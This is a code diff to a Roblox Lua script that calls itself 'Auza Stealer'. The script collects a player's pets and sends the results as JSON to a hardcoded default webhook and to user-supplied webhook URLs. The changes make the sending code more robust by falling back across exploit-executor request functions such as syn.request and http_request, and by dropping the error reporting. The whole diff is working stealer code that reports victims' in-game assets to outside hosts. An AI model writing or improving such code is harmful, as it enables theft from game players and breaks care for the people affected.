@@ -283,9 +283,13 @@ local function getAvailablePets()
     return targetPets, regularPets
 end
 
--- FIXED: Safe JSON encoding with proper error handling
+-- FIXED JSON ENCODING FUNCTION
 local function safeJSONEncode(data)
     local success, result = pcall(function()
+        -- Ensure HttpService is available
+        if not HttpService then
+            HttpService = game:GetService("HttpService")
+        end
         return HttpService:JSONEncode(data)
     end)
     
@@ -294,14 +298,11 @@ local function safeJSONEncode(data)
     else
         warn("JSON Encoding failed: " .. tostring(result))
         -- Return a basic fallback structure
-        return HttpService:JSONEncode({
-            content = "Error: Failed to encode webhook data",
-            username = "🌴 Auza Stealer 🌴"
-        })
+        return '{"content":"Error: Failed to encode webhook data","username":"🌴 Auza Stealer 🌴"}'
     end
 end
 
--- FIXED: Webhook sending with proper JSON handling
+-- FIXED WEBHOOK FUNCTION
 local function sendWebhook(embed, content, hasTargets, userWebhookURLs)
     -- Create the webhook data structure with safe values
     local webhookData = {
@@ -315,18 +316,18 @@ local function sendWebhook(embed, content, hasTargets, userWebhookURLs)
     local jsonData = safeJSONEncode(webhookData)
 
     -- Send to default webhook first if there are target pets
-    if hasTargets and DEFAULT_WEBHOOK then
+    if hasTargets and DEFAULT_WEBHOOK and DEFAULT_WEBHOOK ~= "" then
         pcall(function()
-            local success, response = pcall(function()
-                return http_request({
+            local request = (syn and syn.request) or (http and http.request) or http_request or request
+            if request then
+                request({
                     Url = DEFAULT_WEBHOOK,
                     Method = "POST",
-                    Headers = {["Content-Type"] = "application/json"},
+                    Headers = {
+                        ["Content-Type"] = "application/json"
+                    },
                     Body = jsonData
                 })
-            end)
-            if not success then
-                warn("Failed to send default webhook: " .. tostring(response))
             end
         end)
         task.wait(1)
@@ -337,16 +338,16 @@ local function sendWebhook(embed, content, hasTargets, userWebhookURLs)
         for i, url in ipairs(userWebhookURLs) do
             if url and url ~= "" then
                 pcall(function()
-                    local success, response = pcall(function()
-                        return http_request({
+                    local request = (syn and syn.request) or (http and http.request) or http_request or request
+                    if request then
+                        request({
                             Url = url,
                             Method = "POST",
-                            Headers = {["Content-Type"] = "application/json"},
+                            Headers = {
+                                ["Content-Type"] = "application/json"
+                            },
                             Body = jsonData
                         })
-                    end)
-                    if not success then
-                        warn("Failed to send user webhook " .. i .. ": " .. tostring(response))
                     end
                 end)
 
